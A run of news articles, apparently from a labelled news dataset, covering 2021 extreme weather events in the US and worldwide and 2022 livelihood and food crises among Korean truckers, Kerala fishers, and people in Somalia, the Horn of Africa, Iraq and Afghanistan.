""Saturday morning, mountain ranges such as the Cascades, Sawtooth, Wasatch, and both the central and southern Rockies can expect 1 to 2 feet of snow with totals exceeding 3 feet in the highest elevations of Utah and Colorado,"" the WPC explained.

You can't have snow without cold, and there will be a major drop in temperatures this weekend.

Wind chill alerts are in effect for over half a dozen states across the northern Plains as subzero temperatures are forecast, with wind chills possible down to 45 degrees below zero.

""The dangerously cold wind chills could cause frostbite on exposed skin in as little as 10 minutes,"" the NWS said, referring to areas of Montana, Minnesota, Nebraska, and the Dakotas.

As the arctic air continues farther south and east it will bring plummeting temperatures to some cities that have not yet felt winter's chill.

Saturday, Memphis will go from highs around 70 degrees with thunderstorms down to highs in the mid 30s on Sunday, with some snow showers possibly mixed in.

It will be much colder this weekend into early Monday. Highs in the single digits to mid-teens are forecast on Sunday with lows below zero early Monday morning. Wind chills will drop into the -10 to -25 degree range both on Sunday morning and Monday morning. #IAWX #ILWX #MOWX pic.twitter.com/yWGPqSVqwE — NWS Quad Cities (@NWSQuadCities) December 31, 2021

The Dallas-Fort Worth area, which has set numerous high temperature records in the past two weeks, will also have high temperatures on Saturday in the low 70s, but by Sunday, high temps will drop to the upper 30s.

""The strong cold air advection behind this front will usher in the coldest temperatures of the season by far,"" the NWS office in Dallas/Ft. Worth said

Did you say cold? Why not play some hockey? The Winter Classic outdoor game traditionally played on New Year's Day will be in Minneapolis this year, and it's going to be a cold one.

CNN —

The first tornado watch of the day has been issued for parts of the Midwest as record December heat surges and fuels severe weather across the central US on Wednesday, creating hurricane-force winds, potentially strong overnight tornadoes and an extreme fire threat.

“Another historical weather day is forecast today with 2 never-before-seen outlooks issued,” the National Weather Service tweeted. A moderate severe storm risk is in the Iowa, Minnesota and Wisconsin region, while the severe fire risk is over the Southern and Central Plains. This is the first time such risks in these locations have ever been issued in December.

The system, which has been responsible for several feet of snow and 100 mph (or greater) wind gusts in the West, now has its sights set on the Plains and upper Midwest.

‘Unprecedented’ severe storm threat looms

A line of powerful storms capable of producing tornadoes is racing eastward across Nebraska at 75 mph. Radar has indicated multiple tornadoes are occurring across this line of thunderstorms and will continue to form as it progresses northeast.

A tornado watch has been issued for over 4 million Americans across parts of Iowa, Kansas, Minnesota, Missouri, Nebraska and South Dakota.

More than 20 million people could experience severe weather, including strong tornadoes and hurricane-force winds today, after last week’s tornadoes left parts of Kentucky in shambles.

A moderate – level 4 of 5 – threat covers parts of the Upper Midwest, where another round of widespread severe storms and tornadoes is expected later today and tonight, according to the Storm Prediction Center.

The greatest risk is located south of Minneapolis and includes nearly two million people in Minnesota, Iowa and Wisconsin.

“This threat appears unprecedented for this region this late in the year,” the prediction center said.

“There has not been a moderate risk issued in Minnesota between the months of November and February, according to records dating back to 1987,” said CNN meteorologist Brandon Miller.

Widespread wind gusts of 60-75 mph and tornadoes are forecast. A derecho, or widespread damaging wind event, is possible this afternoon and evening with “embedded gusts of 80-100 mph,” the prediction center warned.

The most dangerous time frame will occur from late this afternoon through sunset and could include nighttime tornadoes. Like the tornado outbreak on Friday and Saturday of last week, much of the activity is expected after dark, when tornadoes are 2.5 times more deadly.

“A nocturnal strong tornado or two are possible, particularly across western to northern Iowa and southeast Minnesota,” the prediction center added.

Fueling these storms is record heat much farther north than expected this time of year, with dozens of record high temperatures expected to fall today.

The unusual December warmth has expanded across a large area of the eastern US, with as many as 250 record temperatures possible from Wednesday to Saturday, according to the National Weather Service.

Minneapolis is forecast to reach the mid-50s Wednesday when the average high temperature is below freezing.

This heat and powerful storm system is also creating an extreme fire threat in the Central Plains on Wednesday.

Hurricane-force winds and extreme fire danger

More than 80 million people are under wind alerts Wednesday, as the same powerful storm system brings hurricane-force wind gusts (74+ mph) to much of the central US.

“We’re very concerned here in western Kansas. This storm has some of the strongest wind values we’ve seen in many years, as predicted by our computer models,” said Bill Turner, lead forecaster with the Dodge City, Kansas, National Weather Service, told CNN.

The concern is not just isolated to the Plains. Strong winds causing hazardous travel conditions will spread across a 1,500 mile stretch of land, as sustained winds of 20-40 mph could be felt from parts of Arizona to Michigan.

Wind gusts could reach 80 mph in some locations, where extremely dry soils and unusually warm December temperatures are colliding to set the stage for extremely dangerous fire conditions.

“Out here in the High Plains, there’s nothing left that’s green. All the grass is brown and dry and ready to burn,” Turner told CNN.

In parts of the Texas and Oklahoma Panhandles, along with western and central Kansas, the Storm Prediction Center has issued a rare level 3 of 3 alert. The center warned that “very dangerous wildfire-spread conditions are expected” in these areas.

CNN Weather

“We haven’t any precipitation here in a long time,” Turner said. “We have gone 42 days since we’ve had measurable precipitation, so the grass is dormant and dry and can take a spark very quickly.”

On Tuesday, record highs fell by the wayside in Texas as highs soared past 80 degrees in cities including Houston. Temperatures reaching into the 70s will spread as far north as Kansas City on Wednesday.

That warmth, coupled with gusty winds and relative humidity below 10%, could make Wednesday a potentially destructive day for millions in the region. On Tuesday, the National Weather Service in Dodge City alerted fire departments of the looming threat.

“We gear them up and make sure they know what the potential threat is. We are all hoping we can get through Wednesday with no ignitions,” Turner added.

In eastern Colorado, temperatures are not nearly as warm, but given the dry landscape, low humidity and fierce gust forecasts to reach as high as 75 mph, any spark could be disastrous.

“We have fire season 24/7 and 365 days across Colorado, and since summer and late fall, we have seen very dry conditions and that has ramped up our fire situation now,” Mark Wankowski, meteorologist at the National Weather Service in Pueblo, Colorado told CNN.

In eastern Colorado and western Kansas, drought conditions range from severe to extreme according to the US Drought Monitor, adding an additional threat to the interstates in the region.

“There’s also a potential for blowing dust and dirt because of our current drought conditions,” Wankowski said. Travelers across Interstates 40 and 70 could be greeted by periods of blowing dust, haze and dangerously low visibility on Wednesday afternoon.

Over 80 million people are under wind alerts as damaging winds, some over hurricane-force (74 mph) are expected for much of the central US Wednesday. CNN Weather

In the Texas Panhandle, the ground is akin to a tinderbox, with months having passed since the last drop of rain fell.

“Our last measurable precipitation for Amarillo was back on October 12, so we have been dry over 60 days and that’s definitely contributing to the fire risk,” said Luigi Meccariel, meteorologist at the National Weather Service in Amarillo.

“The combination of very dry and windy conditions is going to be very dangerous for outdoor activities. We definitely don’t recommend any activities that could cause a ground spark and start fires for Wednesday,” Meccareil added.

The region typically experiences significant fire weather in the spring season, but given the record warmth and the recent dry spell, things look a bit different this year.

“It’s a very unusual day in December by any stretch of the imagination, but as you’ve seen the past week, we’ve had some very unusual weather in the US,” Turner said.",Extreme Weather,2021-12-15 08:00:00

Dec 13 (Reuters) - Extreme weather events in 2021 shattered records around the globe. Hundreds died in storms and heatwaves. Farmers struggled with drought, and in some cases with locust plagues. Wildfires set new records for carbon emissions, while swallowing forests, towns and homes.

Many of these events were exacerbated by climate change. Scientists say there are more to come – and worse – as the Earth's atmosphere continues to warm through the next decade and beyond.

February — A blistering cold spell hit normally warm Texas, killing 125 people in the state and leaving millions without power in freezing temperatures.

Scientists have not reached a conclusion on whether climate change caused the extreme weather, but the warming of the Arctic is causing more unpredictable weather around the globe.

February — Kenya and other parts of East Africa battled some of the worst locust plagues in decades, with the insects destroying crops and grazing grounds. Scientists say that unusual weather patterns exacerbated by climate change created ideal conditions for insects to thrive.

March — Beijing's sky turned orange and flights were grounded during the Chinese capital's worst sandstorm in a decade.

Busloads of volunteers arrive in the desert each year to plant trees, which can stabilize the soil and serve as a wind buffer. Scientists predict climate change will worsen desertification, as hotter summers and drier winters reduce moisture levels.

June — Nearly all of the western United States was gripped by a drought that emerged in early 2020. Farmers abandoned crops, officials announced emergency measures, and the Hoover Dam reservoir hit an all-time low.

By September, the U.S. government confirmed that over the prior 20 months, the Southwest experienced the lowest precipitation in over a century, and it linked the drought to climate change.

June — Hundreds died during a record-smashing heatwave in the U.S. and Canadian Pacific Northwest, which scientists concluded would have been ""virtually impossible"" without climate change.

Over several days, power lines melted and roads buckled. Cities, struggling to cope with the heat, opened cooling centers to protect their residents. During the heatwave, Portland, Oregon, hit an all-time record high of 116 Fahrenheit (46.7 Celsius).

July — Catastrophic flooding killed more than 300 people in central China's Henan province when a year's worth of rain fell in just three days.

Meanwhile in Europe, nearly 200 people died as torrential rains soaked Germany, Belgium and the Netherlands. Scientists concluded that climate change had made the floods 20% more likely to occur.

July — A record heatwave and drought in the U.S. West gave rise to two massive wildfires that tore through California and Oregon and were among the largest in the history of both states.

Scientists say both the growing frequency and the intensity of wildfires are largely attributable to prolonged drought and increasing bouts of excessive heat from climate change.

July — Large parts of South America are suffering from a prolonged drought. While Chile is enduring a decade-long megadrought linked to global warming, this year Brazil saw one of its driest years in a century.

In Argentina, the Parana, South America's second-longest river, fell to its lowest level since 1944.

Around the globe, heatwaves are becoming both more frequent and more severe.

August — In the Mediterranean, a hot and dry summer fanned intense blazes that forced thousands of people to evacuate their homes in Algeria, Greece and Turkey.

The fires, which killed two people in Greece and at least 65 in Algeria, struck amid an intense heatwave, with some places in Greece recording temperatures of over 46 Celsius (115 Fahrenheit).

Late August — Nearly all the world's mountain glaciers are retreating due to global warming. In the Alps, Swiss resort employees laid protective blankets over one of Mount Titlis's glaciers during the summer months to preserve what ice is left.

Switzerland already has lost 500 of its glaciers, and could lose 90% of the 1,500 that remain by the end of the century if global emissions continue to rise, the government said.

August/September — Hurricane Ida, which hit Louisiana as a Category 4 storm, killed nearly 100 people in the United States and caused an estimated $64 billion in damage, according to the NOAA National Centers for Environmental Information.

As the remnants of Ida moved inland, the heavy rains created flash flooding across the densely populated Northeast, vastly increasing the storm's death toll.

Climate change is strengthening hurricanes, while also causing them to linger longer over land – dumping more rain on an area before moving on. Studies also suggest these storms are becoming more frequent in the North Atlantic.

September — Infrastructure and homes in Russia are increasingly in peril as underground permafrost melts and deforms the land underneath them.

Permafrost was once a stable construction base, in some regions staying frozen as far back as the last Ice Age. But rising global temperatures threaten the layer of ice, soil, rocks, sand and organic matter.

November — The worst floods in 60 years in South Sudan have affected about 780,000 people, or one in every 14 residents, according to the U.N. refugee agency. Every year the county goes through a rainy season, but flooding has set records for three years in a row. The destruction will likely increase as temperatures rise, scientists say.

November — A massive storm dumped a month's worth of rain over two days in the Canadian province of British Columbia, unleashing floods and mudslides that destroyed roads, railroads and bridges. It is likely the most expensive natural disaster in Canada's history, although officials are still assessing the damage.

Meteorologists said the rain had come from an atmospheric river, or a stream of water vapor stretching hundreds of miles long from the tropics. Atmospheric rivers are expected to become larger — and possibly more destructive — with climate change, scientists say.

Portland shattered its highest-ever temperature in June, cresting at 116 degrees. On Monday, the record for latest snowfall also fell after a rare shot of winter weather left the city blanketed in heavy, wet snow.

As heat-trapping gases continue to accumulate in the atmosphere — coming from tailpipes, power plants and industrial facilities — extreme weather events are likely to become more common, said Erica Fleishman, a professor at Oregon State University and director of the Oregon Climate Change Research Institute.

“As the climate changes, all types of weather extremes will be more likely,” she said, noting that, while the Earth is becoming warmer on average, there is some evidence that winter storms are being made worse by climate change. “Cold extremes are not becoming more common, but there is mixed evidence about the intensity of winter storms.”

Fleishman points out that, of course, there have been weather extremes for as long as there has been weather, and records have been broken as long as they’ve been kept.

Records are being broken in different ways of late, however. An analysis by The Associated Press found that between 1999 and 2019 the number of record-high temperatures broken in the U.S. was about twice that of record-low temperatures.

In a stable climate, the numbers would be close to equal.

That trend in Oregon is evident in events like the heat dome event of late June, which likely would never have occurred at that intensity without the warming effects of climate change, according to scientists who specialize in identifying links between extreme weather events and climate change.

While the heat dome, which killed nearly 100 people in Oregon, was a 1-in-1,000 year event, it could be more like a 1-in-10 year event by the end of the century if more isn’t done to curb greenhouse gas emissions, Fleishman said.

Sometimes extreme weather comes as the absence of things like rain, as is evident in the ongoing drought that has left much of central and southern Oregon parched heading into a third year of drought. The recent winter weather in the northwest corner of the state has helped bolster the state’s snowpack, which acts as a natural reservoir, but much of the rest of the state is well short of historical snowpack averages, according to the U.S. Department of Agriculture.

Data from the U.S. Department of Agriculture shows many of Oregon's river basins well below historical averages for snowpack, contributing to the region's ongoing drought.

Seven Oregon counties have declared drought emergencies so far this year, and four more have submitted requests for the declarations.

Attributing cold weather events to climate change is more difficult, but scientists know that climate change destabilizes formerly predictable weather patterns, making all types of extreme weather more likely.

“Even though it may seem antithetical to climate change that we are getting snow in April, the fact is that unusual extreme weather of any type is consistent with climate change,” Fleishman said.

A 2021 report from the United Nation’s Intergovernmental Panel on Climate Change, a group of more than 234 scientists from around the world, warned that as the climate continues to warm some places will be hit by multiple extreme weather events at once, like in Oregon where one side of the state gets late-season snow while the other sees snowpacks less than half of historical averages.

U.N. Secretary-General Antonio Guterres called the report a “code red for humanity.”

Fleishman said, over the long-term, the only way to bring down the likelihood of extreme weather events is to drastically reduce or eliminate greenhouse gas emissions altogether.

Clarification: A quote in the story was updated to reflect that cold extremes are not believed to be becoming more common because of climate change, but some evidence suggests winter storms may be intensifying.

""This COP has again shown that climate change is being treated as a problem of the future,"" Otto told Axios.","The pace and severity of climate change are simply outrunning humans' efforts to contain it.

The big picture: Severe flooding hit Canada and the Pacific Northwest before the ink was even dry on the climate agreements reached last week at the COP26 summit. And the extreme weather caused by climate change will continue to worsen, even if every one of those new commitments is met.

The nations attending the summit agreed to try to keep warming to 1.5° Celsius above preindustrial levels, though we're still on course to exceed the goal.

Warming is still slightly below that threshold, at about 1.1°C, but we're barreling toward it — and already seeing unprecedented extreme events even before we get there.

As the world warms, the odds of extreme weather and climate events are rapidly escalating, Any additional increment of warming is dangerous, scientists who study extreme weather events and their climate change connections say.

""It's quite clear that for each additional 0.5°C of warming there is a clearly discernible and substantial increase in the frequency and intensity of extreme temperatures and extreme downpours,"" climate scientist Daniel Swain tells Axios.

The effect isn't linear, he said — double the warming we've seen so far, which the world is on course to do now, would produce more than double an increase in the severity of extreme weather.

Between the lines: At multiple points during COP26, climate negotiators held up pictures of their grandchildren while making speeches about how they worry about what the future generations will face due to climate change.

But climate disasters are occurring here and now, says Friederike Otto of the Grantham Institute at Imperial College in London. She specializes in studying how climate change affects extreme events.

""This COP has again shown that climate change is being treated as a problem of the future,"" Otto told Axios. ""Climate justice seems to have been narrowed just to intergenerational justice but people are dying today, too.""

What's next: Emerging research shows that if and when emissions reach net zero, additional warming would slow down quite quickly, said Michael Mann, a climate scientist at Penn State University. That would halt the escalation in extremes, he said.

The question is how far we let climate change progress before we get to that point, he told Axios. However bad extreme weather has gotten at the time we reach net zero, it's likely to stay there.

The bottom line: ""We do not know with any certainty when to expect nasty surprises like monsoon disruptions, the die-off of the Amazon rainforest, or the disintegration of the West Antarctic or Greenland ice sheets,"" says Kate Marvel, a NASA climate researcher.",Extreme Weather,2021-11-17 08:00:00

Here are some of the most costly weather incidents recorded so far this year.

Record-breaking snowfall, Madrid In the first weeks of 2021, Storm Filomena brought record-breaking levels of snow for Madrid and elderly Spanish citizens were warned to stay at home as temperatures plummeted. The heaviest snow for 50 years brought transport in and out of the city to a “standstill”, Euronews reported. The snowstorm caused around €1.4bn (£1.2bn) of damage, The New York Times said.

Storm Christoph, UK The period from 18 to 20 January 2021 was “one of the wettest three-day periods on record” for North Wales and North-West England, according to the Met Office. Homes in Cheshire were flooded, and residents were evacuated from homes in Manchester and Merseyside. Once Storm Christoph cleared, significant snowfall also led to travel disruption with icy conditions and road closures. Liberal Democrat councillor Richard Kilpatrick told the Manchester Evening News the atmosphere was one of “anxiety and disbelief”.

Cyclone Ana, Fiji Cyclone Ana “pummelled” Fiji towards the end of January, “just a month after category 5 Cyclone Yasa tore through the country’s northern islands”, The Guardian said. Satyendra Prasad, Fiji’s ambassador to the United Nations, said the cyclone – which caused more than 10,000 people to take refuge in 318 evacuation centres across the country – had left behind “a difficult recovery”.

Winter storms, Texas The Week US reported that 3.5 million businesses and homes were left without power in February as temperatures dropped to -13℃ in some areas of Texas. Power went out across the state, leaving many vulnerable people in extremely cold conditions. The total death toll rose from 151 to 210 in July, after a decision was made to include deaths caused by the collapse of the state electric power grid in the final count, The Guardian reported.

Dust storm, China Flights were grounded and schools shut in what the South China Morning post reported as the worst sandstorm in a decade. But what was widely reported as a sandstorm in China was, in fact, a dust storm - “and that’s much worse”, said The Conversation. The miniscule particles can travel “much, much further” than sand, and can cause health risks if they are “drawn deep into the lungs”. In Beijing, the sky became orange as dust and pollution caused hazardous air quality.

Flooding, New South Wales In March, Sydney and New South Wales (NSW) residents felt the effects of extreme flooding. The NSW State Emergency Service (SES) urged residents to take care of both their physical and mental health as heavy downpours lead to rivers and dams overflowing, with thousands evacuated from their homes.

Cyclone Seroja In April 160 people died in Indonesia after a tropical cyclone “hit a remote cluster of islands”, Climate Home News reported. Landslides and flash floods displaced at least 22,000 people, the news site adds. Reaching Western Australia days after it made landfall in Indonesia, residents in the town of Kalbarri, north of Perth, said the storm was “absolutely terrifying”, the BBC reported. Western Australia Premier Mark McGowan said Cyclone Seroja was ""like nothing we have seen before in decades”.

Record temperatures, Moscow As temperatures reached 34.8℃ in Moscow, “the absolute record for any day in June was hit”, The Moscow Times reported. The “abnormal temperatures” of the “record-breaking heatwave” weren’t just recorded in the capital; Penza, Vologda and Petrozavodsk also broke heat records during the month.

Heat dome, Pacific Northwest Soaring temperatures across the Northwest United States “rewrote the record books” this year, National Geographic reported. The “heat dome” was the “most dramatic example” of an extreme weather event, said The Guardian’s global environment editor Jonathan Watts, and the meteorological phenomenon led to evacuations across states that weren’t “remotely prepared for the heat”. Lytton, a village in Canada’s British Columbia, was “engulfed and largely destroyed by a wildfire” as a result of the temperatures, National Geographic continued.

With the growing importance of cash assistance in Iraq and the need to speed up assistance, improve its effectiveness and facilitate monitoring processes, it is crucial to have an agreed Cash for Work (CFW) daily wage rate to support livelihood cluster members in harmonizing their efforts. The Emergency Livelihoods Cluster strategy is designed to help conflicted-affected people cope with the impact of a crisis, improve social cohesion, and reduce tensions that lead to violence, secondary displacement and forced returns. Following this strategy, livelihoods partners’ first objective in responding to the needs of vulnerable communities is to help replace lost assets, especially income-generating ones, and generate urgent cash income for highly vulnerable families in priority locations. Areas that are a high priority for intervention have a high possibility of social tension. Cluster partners will target 159,106 people in need, focusing on newly displaced and people in protracted displacement, host communities, highly vulnerable resident families and returnees depending on their specific situation and the local context.

One of the critical programs livelihoods partners are implementing is cash for work (CfW) to help destitute families in some of the country’s hardest-hit areas. Livelihoods partners and communities have found utility in these programmes. They offer income that beneficiaries can use to meet their basic needs while decreasing social tensions and necessary repairs and maintenance of community and private facilities. With partners often providing CfW opportunities near each other, observed and potential challenges necessitated the production of standard operating procedures. Some challenges include varying wage rates offered by different organizations, selecting beneficiaries where there are limited financial resources that cannot reach all that are in need, gender barriers and cultural limitations on certain types of work, and others addressed in this document. Partners collaborated to produce standard guidelines for use by organizations implementing CfW projects. After the cluster endorses these Standard Operating Procedures(SOPs),partners are encouraged to implement CfW projects accordingly.",Livelihood Crisis,2022-06-13 15:08:32

At stake is his family's livelihood, Kang said, as soaring fuel prices and other costs make it impossible for him to go on while big business can pass on the burden of charging higher prices to customers like himself.

Kang, 50, said in an interview he had no choice but to join the strike even though he was not a member of the union.

""When the other side of the world is getting better, why is our side of the world going backward and getting worse?"" he asked.

The truckers are striking for the seventh day on Monday, protesting against rising fuel prices and demanding minimum pay guarantees.

The action has paralyzed ports and cargo terminals in South Korea — a major supplier of autos, batteries, semiconductors, smartphones and electronics goods — further stretching global supply chains already disrupted by China's COVID-19 curbs and Russia's invasion of Ukraine.

Working as many as 15 hours a day, father-of-three Kang says he earns about $2,300 a month. Since April, his monthly fuel bill has leapt about $1,000.

He has borrowed from his in-laws to pay interest on his loans and says a $800 monthly income from his wife’s part-time job at a nursery is not enough to raise three children.

The truckers' demands center on the extension of a 2020 measure dubbed the ""Safe Trucking Freight Rate, which ensures minimum pay and is set to expire this year.

The union says the measure is crucial to ensure truckers work in sustainable conditions. Being independent contractors, they say it guards against fuel price fluctuations and exploitation by powerful businesses.

The new government of President Yoon Suk-yeol does not control parliament and says it is up to the truckers to negotiate a deal with bosses and the opposition to extend the minimum wage guarantees.

""The most frustrating thing is I’ve been following all the rules, like installing low-emission equipment, even by paying more money if I need to. But why is the situation torturing me now and why would I let things be taken away?"" Kang said.

In 2019, he was paid 280,000 won for a 240 km (149 mile) round trip between Incheon and a Samsung display panel plant in Asan, although other truckers hired by higher-tier subcontractors were paid 320,000 won for the same trip.

Under the minimum rate scheme introduced in 2020, the freight rate increased to about 350,000 won for all truckers including non-union drivers.

The price of diesel at gas pumps was 1,960 won per liter in May 2022, compared to 1,340 won a year before, a 46% jump. Urea solution, mandatory for diesel vehicles, has doubled in price since a supply crisis in November, drivers say. Read full story

Some of the root causes of the food insecurity in the region include poverty and inequality, poor governance, and heavy dependency on food imports. Children experiences on food insecurity are unique and their protection and well-being are directly affected by food instability. Reduced number of daily meals leads to high malnutrition rates, poor health, poor child development, and high child mortality rates. They become more vulnerable and might resort negative coping strategies including child labor, recruitment by armed forces and armed groups, abuse, and sexual exploitation.

In addition, when families face mounting food insecurity, girls are increasingly called upon to care for younger siblings so parents can work or seek food, forcing them to miss or drop out of school. Loss of access to education jeopardizes girls’ protection, and increases their exposure to GBV and other harmful practices including child, early and forced marriage and female genital mutilation. It also undermines their long-term wellbeing and future prospects.

Plan International is addressing the worsening food crisis, by scaling up responses such as food distributions, cash and voucher assistance, school meals, malnutrition screening and nutrition supplementation. In addition to lifesaving interventions, Plan International is stepping up livelihood protection and support activities such as livestock supplementary feeding, seed and other agriculture input provision.

With its special emphasis on preventing and tackling the distinct impact of food insecurity on girls, adolescent girls and youth, Plan International also focuses on gender responsive child protection, GBV prevention, early childhood development and sexual and reproductive health and rights services and for critical school feeding programmes.

High operational costs have forced many to scrap boats

With hardly three weeks left for the annual trawl ban, the fisheries sector in the State is teetering on the brink of a tipping point.

As per reports, more than 500 trawlers were scrapped during the last one-and-a-half years rendering hundreds of fishers jobless. A large percentage of the traditional fleet too has stopped venturing into the sea and currently the sector is in the throes of a severe livelihood crisis.

“I bought my boat in 2017 when the diesel price was around ₹50. Member of a modest fisher family, I had to mortgage my house to raise the money. Five years down the road, we live in a rented house and my boat was sold to scrap dealers last month. I had invested over ₹20 lakh and the scrap price was ₹6 lakh. The vessel was seaworthy when I scrapped it and the average life span of a boat is around 20 years. Operational costs have tripled over the last few years and many of us are forced to scrap the boats,” says Paul, a boat owner.

700 boats scrapped

At present a slew of vessels at various yards in the State are waiting to get scrapped. “Nearly 700 boats were scrapped across Kerala in the past couple of years. If this continues the sector will come to a standstill within the next six months,” says Joseph Xavier Kalappurakkal, general secretary, All Kerala Fishing Boat Operators Association.

According to association president Peter Mathias, the next season will be the last straw for many and if the post-monsoon landings are not good, scrapping will be the only choice. “After the crisis deepened it became so hard to sell boats. Second-hand boats had a good market as they can be used for a reasonable period with proper maintenance. But today venturing into the sea means heavy losses and there are no buyers for boats. Most of the boat owners are struggling to manage mounting debts and they are scrapping vessels in good condition since they can’t afford daily trips and maintenance,” he says.

Major factor

Mr. Kalappurakkal says the hostile attitude of the Fisheries department is a major factor deepening the crisis. “We are ready to switch to any method that can control juveniles entering the nets. It is practically impossible to avoid by-catch even with the square mesh nets. In the middle of this crisis boats are slapped with heavy penalties.”

He adds that all stakeholders, including vendors, processors and exporters, are planning to form a collective to save the sector and launch Statewide protests.

“You need ₹26,500 to renew the fishing licence in Kerala whereas it’s from ₹1,000 to ₹3,000 in other States. Government keeps talking about the welfare schemes they introduced, but they are doing nothing to protect the livelihood of nearly 15 lakh fishers,” he adds.",Livelihood Crisis,2022-05-22 07:00:00

News Release: Food insecurity and malnutrition are worsening across Somalia. The risk of famine is increasing amid a historic fourth failed rainy season.



UN agencies are calling on the international community to act fast to avoid catastrophe: https://t.co/eIghGaunRF pic.twitter.com/ZHy8lMr1qX — FAO in Somalia (@FAOSomalia) June 7, 2022

The alert follows four successive seasons of failed rains in the east African region – a situation not seen in at least 40 years – which have left 386,000 children in acute need of lifesaving treatment for severe malnutrition in Somalia alone.

Worse than 2011 famine

This is worse than in 2011, when famine claimed the lives of 250,000 mainly children in Somalia, explained Rania Dagash, UNICEF Deputy Director for eastern and southern Africa: “The lives of children in the Horn of Africa are also at an increased risk because of the war in Ukraine and I think it’s important to emphasise this, because Somalia alone used to import 92 per cent of its wheat from Russia and Ukraine, but now supply lines are blocked.”

As a direct result of rainy season failures and the Ukraine war’s impact on global supply chains, the cost of life-saving therapeutic food that UNICEF uses to treat children with severe acute malnutrition, is projected to rise by 16 per cent globally over the next six months.

This means that UNICEF will require an estimated additional $12 million more than expected for the Horn of Africa alone, Ms. Dagash explained.

Resilience-building is key

In addition to calling on the international community to provide more funding for emergency assistance, UN humanitarians have stressed that what is also needed is investment in resilience-building measures, to save people’s livelihoods and prevent them from having to leave their homes, in search of food, water and healthcare.

“If the world does not widen its gaze from the war in Ukraine, and act immediately, an explosion of child deaths is about to happen in the Horn of Africa,” Ms. Dagash told journalists in Geneva.

Kids most vulnerable

The number of children facing severe acute malnutrition has increased by more than 15 per cent in the space of five months, the UNICEF officer explained via video link from Nairobi, adding that across Ethiopia, Kenya and Somalia, more than 1.7 million children are in urgent need of treatment.

Latest weather forecasts offer no reassurance either, as they suggest that the next October to December rains are likely to fail, too.

The likely outcome is yet more crop failures and the deaths of yet more livestock as water sources dry up.

Millions of animal deaths

Some three million livestock have died since mid-2021, from drought and disease, according to the UN Food and Agriculture Organization (FAO).

These impacts of drought on livestock means that the decline in meat and milk production has led to worsening malnutrition, particularly among young children in pastoral areas who are dependent on local supply.

According to UNICEF, between February and May this year, the number of households without reliable access to clean and safe water almost doubled, from 5.6 million to 10.5 million.

To help communities resist ever more frequent droughts caused by climate change, UN teams and partners have had to dig even deeper wells than before, in some cases down to two kilometres.

The UN and its partners are also channelling limited resources into famine prevention projects.

“We’re assisting rural families to stay where they are by providing lifesaving cash transfers to purchase essentials such as food, water and medicine, as well as livelihood items,” said Etienne Peterschmitt, FAO Representative in Somalia.

Real risk of starvation

The FAO representative noted that support required for 2022 for this lifesaving and livelihood safeguarding work “has not yet fully materialized, and hundreds of thousands of Somalis are at a very real risk of starvation and death”.

The latest analysis from the Integrated Food Security Phase Classification (IPC) platform shows that 7.1 million people, or 45 per cent of the country, are in IPC Phase 3 or “Crisis” or worse food security outcomes. Families in the most affected areas do not have enough to eat and are using crisis-coping strategies to stave off hunger.

Out of this 7.1 million, around 2.1 million people are in IPC 4 or “Emergency” level, which is signified by very high acute malnutrition and rising levels of death among children and adults.

Some 213,000 people are in IPC 5 - “Catastrophe” level - a 160 per cent increase in the number of people facing extreme lack of food, facing starvation death and destitution, since the last IPC report in mid-April.",Livelihood Crisis,2022-06-07 14:50:51

It has been three months since the conflict in Ukraine began and the wider ramifications are being felt around the globe. 4,000 miles away in the Horn of Africa, countries are facing a food insecurity catastrophe due to the disruption of deliveries of crucial supplies.

Before the conflict in Europe, nearly one-third East Africa’s cereal supply came from Russia and Ukraine. Conflict has upended global supply, leaving those in the Horn of Africa without a critical supplier of food. The disruption of wheat and fertilizer supplies is compounding an already devastating situation. Ethiopia, Somalia and Kenya grow closer to a fourth season of drought – expected to be the worst in 40 years – and face a food insecurity disaster with their supplies dwindling and wheat and fertilizer prices increasing.

With the conflict and devastating humanitarian crisis in Ukraine dominating the headlines, there is concern that the ongoing crisis unfolding in the Horn of Africa will be forgotten. Amid these complex challenges, the Red Cross is committed to helping those in need with urgent humanitarian assistance.

Millions Need Help

As climate change-induced disasters devastate agriculture, grasslands and water resources, the region has struggled to make up the difference. Climate change, the impacts of COVID-19, locust invasions and conflict in the region have further exacerbated an already dire situation. Now, more than 14 million people need urgent food aid. That number is expected to rise to more than 20 million as conditions worsen.

Red Cross on the Ground

International teams are working in concert with local Red Cross societies to deliver critical goods, cash assistance and implement preparedness efforts to support the most vulnerable, including more than five million children.

Since diminished access to food and water sources fosters a population increasingly vulnerable to hygiene, water and sanitation plight, Red Cross teams are focusing their manpower on reinforcing community water points and providing hygiene and sanitation services to address complications from already jeopardized water sources.

Red Cross teams in Ethiopia, Somalia and Kenya are bridging the financial gap with cash assistance for vulnerable families who are impacted by the global price hike. The American Red Cross is pitching in to do its part. Thus far, the American Red Cross has contributed $380,000 to the Somali Red Cross to support cash assistance and $355,000 to the Kenyan Red Cross in support of clean water. These efforts include water sanitation, hygiene through water trucking and rehabilitation of community water points and boreholes. In addition to immediate aid, Red Cross teams are also developing long-term plans, focusing their efforts on maintaining mobile health clinics and targeting hard-to-reach areas with malnutrition screening, referrals and provision of nutrition supplements.

Updating pre-existing solutions is one way that the Red Cross and Red Crescent teams work to reduce vulnerability. With an additional pledge of $780,000 to the region, the American Red Cross will continue to aid in projects like implementing holistic livelihood interventions to achieve long-term climate-smart livelihoods and food security across the Horn of Africa.",Livelihood Crisis,2022-06-01 07:00:00

WHEN the Americans were leaving Afghanistan in August 2021, two kinds of immediate crisis were predicted by everyone who was even remotely connected to Afghanistan. One, there was a clear indication that the return of the Taliban government would induce an unabating socio-political chaos. And two, the country would be catapulted into an economic crisis because of the apparent possibilities of suspension of developmental funds and aids to Afghanistan.

But nobody predicted that time that Afghanistan would face one of the most horrible food and humanitarian crisis within few months. The severity of the crisis can be gauged from the fact that analysts are expecting more Afghans to die because of this crisis than all Afghan deaths in 20-year war. Majority of Afghan households have lost some or all of their livelihood over the past eight months. Indubitably, roots of Afghanistan’s crisis can be traced to tight external restrictions on the country’s banking sector and international humanitarian and development funds.

In a direct attempt to bowdlerize the Taliban’s access to foreign assets, the US government imposed extremely stringent restrictions on transactions with Afghanistan’s central bank. Ever since the Taliban takeover in 2021, the US government has suspended the recognition of Afghanistan’s central bank which has practically severed the country’s economy from the world and severely hampered the payment of essential projects and salaries of millions of government officials, including teachers, health workers and other general workers.

